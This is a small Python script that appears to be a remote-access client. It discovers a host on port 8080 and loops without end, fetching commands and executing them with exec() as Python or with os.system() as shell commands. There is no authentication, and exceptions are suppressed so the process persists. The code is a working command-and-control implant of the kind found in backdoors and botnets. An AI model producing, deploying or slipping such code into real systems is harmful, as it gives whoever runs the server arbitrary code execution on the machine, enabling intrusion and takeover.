import os.path
import socket
import json
from time import sleep

from common import Client, find_host

HOST = 'localhost'
PORT = 8080

commands = {}

def Command(cmd):
    commands[cmd.__name__] = cmd
    return cmd

@Command
def python(data):
    exec(data, globals())

@Command
def cmd(data):
    os.system(data)


def get_command():
    response = client.request_endpoint("getCommand")

    if response["COMMAND_TYPE"] in commands:
        commands[response["COMMAND_TYPE"]](response["CONTENT"])


if __name__ == '__main__':
    # main()
    while True:
        try:
            host = find_host(PORT)
            client = Client(host, PORT)

            while True:
                try:
                    response = client.request_endpoint("hwy")
                    print(response)
                    for i in range(response["ANSWER"]):
                        get_command()
                    sleep(5)

                except Exception as e:
                    print(e)

        except:
            pass